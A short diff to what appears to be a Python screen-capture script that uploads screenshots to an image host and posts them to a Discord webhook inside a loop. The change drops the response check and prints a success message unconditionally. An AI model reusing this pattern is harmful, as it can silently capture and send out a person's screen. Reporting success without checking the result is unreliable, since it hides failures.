@@ -108,11 +108,8 @@ def reportscreen(screenshot, discord_webhook, imgbb_api_key):
     if image_url:
         payload = {"content": "Screenshot", "embeds": [{"image": {"url": image_url}}]}
         response = requests.post(discord_webhook, json=payload)
+        print("Screenshot sent successfully to Discord webhook.")
 
-        if response.status_code == 200:
-            print("Screenshot sent successfully to Discord webhook.")
-        else:
-            print(f"Failed to send screenshot. Status code: {response.status_code}")
 
 
 while True:
